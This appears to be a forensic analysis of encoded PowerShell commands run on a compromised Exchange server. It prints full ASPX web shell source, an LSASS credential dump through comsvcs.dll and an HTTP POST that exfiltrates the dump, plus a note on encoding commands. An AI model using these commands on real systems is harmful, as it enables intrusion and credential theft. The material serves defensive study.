The following commands were passed to the compromised server. Some of them are encoded, and for each of them a brief description of their purpose is given.

PowerShell command n° 1
powershell –enc dwBoAG8AYQBtAGkA
Decoded: whoami. This command displays the username of the current user.

PowerShell command n° 2
powershell –enc cwBjACAALQBwAGEAdABoACAAYwA6AFwAaQBuAGUAdABwAHUAYgBcAHcAdwB3AHIAbwBvAHQAXABhAHMAcABuAGUAdABfAGMAbABpAGUAbgB0AFwAdABlAHMAdAAuAHQAeAB0ACAALQB2AGEAbAB1AGUAIAAoAGkAZQB4ACgAJwBsAHMAIABjADoAXABpAG4AZQB0AHAAdQBiAFwAdwB3AHcAcgBvAG8AdABcAGEAcwBwAG4AZQB0AF8AYwBsAGkAZQBuAHQAXAAnACkAfABPAHUAdAAtAFMAdAByAGkAbgBnACkA
Decoded:
 sc -path c:\inetpub\wwwroot\aspnet_client\test.txt – value (iex('ls c:\inetpub\wwwroot\aspnet_client\')|Out-String)
This command executes a directory lookup on the directory where the web shell is located and writes the output to the “test.txt” file which can be accessed through the web shell.

PowerShell command n° 3
powershell –enc JABhAD0AHSBQAEMAVgBBAEkARgBCAGgAWgAyAFUAZwBUAEcARgB1AFoAMwBWAGgAWgAyAFUAOQBJAGsATQBqAEkAaQBCAEUAWgBXAEoAMQBaAHoAMABpAGQASABKADEAWgBTAEkAZwBkAG0ARgBzAGEAVwBSAGgAZABHAFYAUwBaAFgARgAxAFoAWABOADAAUABTAEoAbQBZAFcAeAB6AFoAUwBJAGcASgBUADQASwBQAEMAVgBBAEkARQBsAHQAYwBHADkAeQBkAEMAQgBPAFkAVwAxAGwAYwAzAEIAaABZADIAVQA5AEkAbABOADUAYwAzAFIAbABiAFMANQBFAGEAVwBGAG4AYgBtADkAegBkAEcAbABqAGMAeQBJAGcASgBUADQASwBQAEMAVgBBAEkARQBsAHQAYwBHADkAeQBkAEMAQgBPAFkAVwAxAGwAYwAzAEIAaABZADIAVQA5AEkAbABOADUAYwAzAFIAbABiAFMANQBKAFQAeQBJAGcASgBUADQASwBQAEMAVgBBAEkARQBsAHQAYwBHADkAeQBkAEMAQgBPAFkAVwAxAGwAYwAzAEIAaABZADIAVQA5AEkAbABOADUAYwAzAFIAbABiAFMASQBnAEoAVAA0AEsAUABDAFYAQQBJAEUAbAB0AGMARwA5AHkAZABDAEIATwBZAFcAMQBsAGMAMwBCAGgAWQAyAFUAOQBJAGwATgA1AGMAMwBSAGwAYgBTADUAVQBaAFgAaAAwAEkAaQBBAGwAUABnAG8AOABjADIATgB5AGEAWABCADAASQBIAEoAMQBiAG0ARgAwAFAAUwBKAHoAWgBYAEoAMgBaAFgASQBpAFAAZwBwAHcAYwBtADkAMABaAFcATgAwAFoAVwBRAGcAYwAzAFIAeQBhAFcANQBuAEkARQBWADQAWQAyAGgAaABiAG0AZABsAFUAbgBWAHUAZABHAGwAdABaAFMAZwBwAEMAbgBzAEsAYwBtAFYAMABkAFgASgB1AEkASABNAHUAVgBHAFYANABkAEMANQBVAGIAMQBOADAAYwBtAGwAdQBaAHkAZwBwAE8AdwBwADkAQwBuAEIAeQBiADMAUgBsAFkAMwBSAGwAWgBDAEIAMgBiADIAbABrAEkARQBOAGYAUQAyAHgAcABZADIAcwBvAGIAMgBKAHEAWgBXAE4AMABJAEgATgBsAGIAbQBSAGwAYwBpAHcAZwBSAFgAWgBsAGIAbgBSAEIAYwBtAGQAegBJAEcAVQBwAEMAbgBzAEsAUQBuAGwAMABaAFYAdABkAEkARgBNAGcAUABTAEIAVABlAFgATgAwAFoAVwAwAHUAUQAyADkAdQBkAG0AVgB5AGQAQwA1AEcAYwBtADkAdABRAG0ARgB6AFoAVABZADAAVQAzAFIAeQBhAFcANQBuAEsARQBWADQAWQAyAGgAaABiAG0AZABsAFUAbgBWAHUAZABHAGwAdABaAFMAZwBwAEsAVABzAEsAYwAzAFIAeQBhAFcANQBuAEkASABCAGgAZABHAGcAZwBQAFMAQgBBAEkAawBNADYAWABGAEIAeQBiADIAZAB5AFkAVwAxAEUAWQBYAFIAaABYAEgAQgBoAGUAVwB4AHYAWQBXAFEAdQBaAFgAaABsAEkAagBzAEsASQBDAEEAZwBJAEMAQQBnAEkAQwBBAHYATAB5AEIARQBaAFcAeABsAGQARwBVAGcAZABHAGgAbABJAEcAWgBwAGIARwBVAGcAYQBXAFkAZwBhAFgAUQBnAFoAWABoAHAAYwAzAFIAegBMAGcAbwBnAEkAQwBBAGcASQBDAEEAZwBJAEcAbABtAEkAQwBoAEcAYQBXAHgAbABMAGsAVgA0AGEAWABOADAAYwB5AGgAdwBZAFgAUgBvAEsAUwBrAEsASQBDAEEAZwBJAEMAQQBnAEkAQwBCADcAQwBpAEEAZwBJAEMAQQBnAEkAQwBBAGcASQBDAEEAZwBJAEUAWgBwAGIARwBVAHUAUgBHAFYAcwBaAFgAUgBsAEsASABCAGgAZABHAGcAcABPAHcAbwBnAEkAQwBBAGcASQBDAEEAZwBJAEgAMABLAEkAQwBBAGcASQBDAEEAZwBJAEMAQQB2AEwAMABOAHkAWgBXAEYAMABaAFMAQgAwAGEARwBVAGcAWgBtAGwAcwBaAFMANABLAEkAQwBBAGcASQBDAEEAZwBJAEMAQgAxAGMAMgBsAHUAWgB5AEEAbwBSAG0AbABzAFoAVgBOADAAYwBtAFYAaABiAFMAQgBtAGMAeQBBADkASQBFAFoAcABiAEcAVQB1AFEAMwBKAGwAWQBYAFIAbABLAEgAQgBoAGQARwBnAHAASwBRAG8AZwBJAEMAQQBnAEkAQwBBAGcASQBIAFYAegBhAFcANQBuAEkAQwBoAE4AWgBXADEAdgBjAG4AbABUAGQASABKAGwAWQBXADAAZwBiAFMAQQA5AEkARwA1AGwAZAB5AEIATgBaAFcAMQB2AGMAbgBsAFQAZABIAEoAbABZAFcAMABvAFUAeQBrAHAAQwBuAHMASwBiAFMANQBEAGIAMwBCADUAVgBHADgAbwBaAG4ATQBwAE8AdwBwADkAQwBuADAASwBQAEMAOQB6AFkAMwBKAHAAYwBIAFEAKwBDAGoAeABvAGQARwAxAHMAUABnAG8AOABaAG0AOQB5AGIAUwBCAHAAWgBEADAAaQBaAG0AOQB5AGIAUwBJAGcAYwBuAFYAdQBZAFgAUQA5AEkAbgBOAGwAYwBuAFoAbABjAGkASQBnAFAAZwBvADgAWQBYAE4AdwBPAGwAUgBsAGUASABSAEMAYgAzAGcAZwBjAG4AVgB1AFkAWABRADkASQBuAE4AbABjAG4AWgBsAGMAaQBJAGcAUwBVAFEAOQBJAG4ATQBpAEkARgBaAGgAYgBIAFYAbABQAFMASQBpAEkARwBsAHUAYwBIAFYAMABJAEgATgAwAGUAVwB4AGwAUABTAEoAaQBiADMASgBrAFoAWABJADYATQBIAEIANABJAGkAOAArAEMAagB4AGgAYwAzAEEANgBRAG4AVgAwAGQARwA5AHUASQBFAGwARQBQAFMASgBEAEkAaQBCAHkAZABXADUAaABkAEQAMABpAGMAMgBWAHkAZABtAFYAeQBJAGkAQgBVAFoAWABoADAAUABTAEkAaQBJAEUAOQB1AFEAMgB4AHAAWQAyAHMAOQBJAGsATgBmAFEAMgB4AHAAWQAyAHMAaQBJAEMAOAArAEMAagB3AHYAWgBtADkAeQBiAFQANABLAFAAQwA5AGkAYgAyAFIANQBQAGcAbwA4AEwAMgBoADAAYgBXAHcAKwAdIDsAJABhAD0AWwBTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBFAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJAC4ARwBlAHQAUwB0AHIAaQBuAGcAKABbAFMAeQBzAHQAZQBtAC4AQwBvAG4AdgBlAHIAdABdADoAOgBGAHIAbwBtAEIAYQBzAGUANgA0AFMAdAByAGkAbgBnACgAJABhACkAKQA7AHMAYwAgAC0AcABhAHQAaAAgABwgYwA6AFwAcAByAG8AZwByAGEAbQBkAGEAdABhAFwAYQAuAHQAeAB0AB0gIAAtAHYAYQBsAHUAZQAgACQAYQAgAC0ARgBvAHIAYwBlADsAcwBjACAALQBwAGEAdABoACAAYwA6AFwAaQBuAGUAdABwAHUAYgBcAHcAdwB3AHIAbwBvAHQAXABhAHMAcABuAGUAdABfAGMAbABpAGUAbgB0AFwAdABlAHMAdAAuAHQAeAB0ACAALQB2AGEAbAB1AGUAIAAoAGkAZQB4ACgAGCBsAHMAIABjADoAXABwAHIAbwBnAHIAYQBtAGQAYQB0AGEAXAAZICkAfABPAHUAdAAtAFMAdAByAGkAbgBnACkA
Decoded:
$a="PCVAIFBhZ2UgTGFuZ3VhZ2U9IkMjIiBEZWJ1Zz0idHJ1ZSIgdmFsaWRhdGVSZXF1ZXN0PSJmYWxzZSIgJT4NCjwlQCBJbXBvcnQgTmFtZXNwYWNlPSJTeXN0ZW0uRGlhZ25vc3RpY3MiICU+DQo8JUAgSW1wb3J0IE5hbWVzcGFjZT0iU3lzdGVtLklPIiAlPg0KPCVAIEltcG9ydCBOYW1lc3BhY2U9IlN5c3RlbSIgJT4NCjwlQCBJbXBvcnQgTmFtZXNwYWNlPSJTeXN0ZW0uVGV4dCIgJT4NCjxzY3JpcHQgcnVuYXQ9InNlcnZlciI+DQpwcm90ZWN0ZWQgc3RyaW5nIEV4Y2hhbmdlUnVudGltZSgpDQp7DQoJcmV0dXJuIHMuVGV4dC5Ub1N0cmluZygpOw0KfQ0KcHJvdGVjdGVkIHZvaWQgQ19DbGljayhvYmplY3Qgc2VuZGVyLCBFdmVudEFyZ3MgZSkNCnsNCgkJQnl0ZVtdIFMgPSBTeXN0ZW0uQ29udmVydC5Gcm9tQmFzZTY0U3RyaW5nKEV4Y2hhbmdlUnVudGltZSgpKTsNCgkJc3RyaW5nIHBhdGggPSBAIkM6XFByb2dyYW1EYXRhXHBheWxvYWQuZXhlIjsNCiAgICAgICAgCS8vIERlbGV0ZSB0aGUgZmlsZSBpZiBpdCBleGlzdHMuDQogICAgICAgIAlpZiAoRmlsZS5FeGlzdHMocGF0aCkpDQogICAgICAgIAl7DQogICAgICAgICAgICAJRmlsZS5EZWxldGUocGF0aCk7DQogICAgICAgIAl9DQogICAgICAgIAkvL0NyZWF0ZSB0aGUgZmlsZS4NCiAgICAgICAgCXVzaW5nIChGaWxlU3RyZWFtIGZzID0gRmlsZS5DcmVhdGUocGF0aCkpDQogICAgICAgIAl1c2luZyAoTWVtb3J5U3RyZWFtIG0gPSBuZXcgTWVtb3J5U3RyZWFtKFMpKQ0KCQl7DQoJCW0uQ29weVRvKGZzKTsNCgkJfQ0KfQ0KPC9zY3JpcHQ+DQo8aHRtbD4NCjxmb3JtIGlkPSJmb3JtIiBydW5hdD0ic2VydmVyIiA+DQo8YXNwOlRleHRCb3ggcnVuYXQ9InNlcnZlciIgSUQ9InMiIFZhbHVlPSIiIGlucHV0IHN0eWxlPSJib3JkZXI6MHB4Ii8+DQo8YXNwOkJ1dHRvbiBJRD0iQyIgcnVuYXQ9InNlcnZlciIgVGV4dD0iIiBPbkNsaWNrPSJDX0NsaWNrIiAvPg0KPC9mb3JtPg0KPC9ib2R5Pg0KPC9odG1sPg==";$a=[System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String($a));sc -path "c:\programdata\a.txt" – value $a – Force;sc -path c:\inetpub\wwwroot\aspnet_client\test.txt – value (iex('ls c:\programdata\')|Out-String)
This command defines a variable “$a”, which is itself encoded and decodes as a web shell and outputs the value of the variable to a file “a.txt” located at “C:\ProgramData\a.txt”

<%@ Page Language="C#" Debug="true" validateRequest="false" %>
<%@ Import Namespace="System.Diagnostics" %>
<%@ Import Namespace="System.IO" %>
<%@ Import Namespace="System" %>
<%@ Import Namespace="System.Text" %>
<script runat="server">
protected string ExchangeRuntime()
{
	return s.Text.ToString();
}
protected void C_Click(object sender, EventArgs e)
{
		Byte[] S = System.Convert.FromBase64String(ExchangeRuntime());
		string path = @"C:\ProgramData\payload.exe";
        	// Delete the file if it exists.
        	if (File.Exists(path))
        	{
            	File.Delete(path);
        	}
        	//Create the file.
        	using (FileStream fs = File.Create(path))
        	using (MemoryStream m = new MemoryStream(S))
		{
		m.CopyTo(fs);
		}
}
</script>
<html>
<form id="form" runat="server" >
<asp:TextBox runat="server" ID="s" Value="" input style="border:0px"/>
<asp:Button ID="C" runat="server" Text="" OnClick="C_Click" />
</form>
</body>
</html>

PowerShell command n° 4
powershell –enc QwBvAHAAeQAtAEkAdABlAG0AIAAtAHAAYQB0AGgAIABjADoAXABwAHIAbwBnAHIAYQBtAGQAYQB0AGEAXABhAC4AdAB4AHQAIAAtAEQAZQBzAHQAaQBuAGEAdABpAG8AbgAgACIAQwA6AFwAUAByAG8AZwByAGEAbQAgAEYAaQBsAGUAcwBcAE0AaQBjAHIAbwBzAG8AZgB0AFwARQB4AGMAaABhAG4AZwBlACAAUwBlAHIAdgBlAHIAXABWADEANQBcAEYAcgBvAG4AdABFAG4AZABcAEgAdAB0AHAAUAByAG8AeAB5AFwAbwB3AGEAXABhAHUAdABoAFwAYwB1AHIAcgBlAG4AdABcAHQAaABlAG0AZQBzAFwAUgBlAHMAbwB1AHIAYwBlAEgAYQBuAGQAbABlAHIALgBhAHMAcAB4ACIAIAAtAEYAbwByAGMAZQA7AHMAYwAgAC0AcABhAHQAaAAgAGMAOgBcAGkAbgBlAHQAcAB1AGIAXAB3AHcAdwByAG8AbwB0AFwAYQBzAHAAbgBlAHQAXwBjAGwAaQBlAG4AdABcAHQAZQBzAHQALgB0AHgAdAAgAC0AdgBhAGwAdQBlACAAKABpAGUAeAAoACcAbABzACAAIgBDADoAXABQAHIAbwBnAHIAYQBtACAARgBpAGwAZQBzAFwATQBpAGMAcgBvAHMAbwBmAHQAXABFAHgAYwBoAGEAbgBnAGUAIABTAGUAcgB2AGUAcgBcAFYAMQA1AFwARgByAG8AbgB0AEUAbgBkAFwASAB0AHQAcABQAHIAbwB4AHkAXABvAHcAYQBcAGEAdQB0AGgAXABjAHUAcgByAGUAbgB0AFwAdABoAGUAbQBlAHMAXAAiACcAKQB8AE8AdQB0AC0AUwB0AHIAaQBuAGcAKQA=
Decoded:
Copy-Item -path c:\programdata\a.txt – Destination "C:\Program Files\Microsoft\Exchange Server\V15\FrontEnd\HttpProxy\owa\auth\current\themes\ResourceHandler.aspx" – Force;sc -path c:\inetpub\wwwroot\aspnet_client\test.txt – value (iex('ls "C:\Program Files\Microsoft\Exchange Server\V15\FrontEnd\HttpProxy\owa\auth\current\themes\"')|Out-String)
This command creates yet another web shell configured to take base64-encoded content which will be decoded and converted into binary, which allows to drop executables onto the server.

PowerShell command n° 5
powershell –enc cwBjACAALQBwAGEAdABoACAAIgBjADoAXABwAHIAbwBnAHIAYQBtAGQAYQB0AGEAXABhAC4AdAB4AHQAIgAgAC0AdgBhAGwAdQBlACAAJABhACAALQBGAG8AcgBjAGUAOwBzAGMAIAAtAHAAYQB0AGgAIABjADoAXABpAG4AZQB0AHAAdQBiAFwAdwB3AHcAcgBvAG8AdABcAGEAcwBwAG4AZQB0AF8AYwBsAGkAZQBuAHQAXAB0AGUAcwB0AC4AdAB4AHQAIAAtAHYAYQBsAHUAZQAgACgAaQBlAHgAKAAnAG4AbAB0AGUAcwB0ACAALwBkAGMAbABpAHMAdAA6ACcAKQB8AE8AdQB0AC0AUwB0AHIAaQBuAGcAKQA=
Decoded:
powershell sc -path "c:\programdata\a.txt" – value $a – Force;sc -path c:\inetpub\wwwroot\aspnet_client\test.txt – value (iex('nltest /dclist:')|Out-String)
This command lists the domain controllers available and outputs the result in the “test.txt” previously created. [XXX]

PowerShell command n° 6
powershell –enc cwBjACAALQBwAGEAdABoACAAIgBjADoAXABwAHIAbwBnAHIAYQBtAGQAYQB0AGEAXABhAC4AdAB4AHQAIgAgAC0AdgBhAGwAdQBlACAAJABhACAALQBGAG8AcgBjAGUAOwBzAGMAIAAtAHAAYQB0AGgAIABjADoAXABpAG4AZQB0AHAAdQBiAFwAdwB3AHcAcgBvAG8AdABcAGEAcwBwAG4AZQB0AF8AYwBsAGkAZQBuAHQAXAB0AGUAcwB0AC4AdAB4AHQAIAAtAHYAYQBsAHUAZQAgACgAaQBlAHgAKAAnAG4AZQB0ACAAZwByAG8AdQBwACAAIgBkAG8AbQBhAGkAbgAgAGMAbwBtAHAAdQB0AGUAcgBzACIAIAAvAGQAbwBtAGEAaQBuACcAKQB8AE8AdQB0AC0AUwB0AHIAaQBuAGcAKQA=
Decoded:
sc -path "c:\programdata\a.txt" – value $a – Force;sc -path c:\inetpub\wwwroot\aspnet_client\test.txt – value (iex('net group "domain computers" /domain')|Out-String)
This command lists the computers available in the network and outputs the result in the “test.txt” previously created.

PowerShell command n° 7
powershell –enc cwBjACAALQBwAGEAdABoACAAYwA6AFwAaQBuAGUAdABwAHUAYgBcAHcAdwB3AHIAbwBvAHQAXABhAHMAcABuAGUAdABfAGMAbABpAGUAbgB0AFwAdABlAHMAdAAuAHQAeAB0ACAALQB2AGEAbAB1AGUAIAB0AGUAcwBlAHQA
Decoded:
sc -path c:\inetpub\wwwroot\aspnet_client\test.txt – value teset
This command overwrites the “test.txt” file content to “teset”.

PowerShell command n° 8
powershell.exe –noninteractive –executionpolicy bypass ipconfig /all
This command outputs the network configuration of the current machine.

PowerShell command n° 9
powershell.exe –noninteractive –executionpolicy bypass net group ‘domain admins’ /domain
This command lists the members of the “domain admins” group.

PowerShell command n° 10
powershell.exe –noninteractive –executionpolicy bypass quser
This command outputs information on the current user.

PowerShell command n° 11
powershell.exe –noninteractive –executionpolicy bypass ps lsass
This command outputs information on the local authentication service “LSASS”.

PowerShell command n° 12
powershell.exe –noninteractive –executionpolicy bypass rundll32.exe C:\windows\System32\comsvcs.dll, MiniDump [PID] C:\programdata\a.zip full
This command dumps the memory of the LSASS process for which the process ID was found running the previous command.

PowerShell command n° 13
powershell.exe "Invoke-WebRequest –Uri 10.200.10.2:80 –Method POST –Infile C:\programdata\a.zip –TimeoutSec 666 –Headers @{ Authorization = 'Basic ZGVtbzpkZW1v' }" –UseBasicParsing
This command creates an HTTP POST request to a distant server, whose body is the previously extracted LSASS dump.


Notes:
$string = {[COMMAND]}.ToString()
$encodedcommand = Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($string))
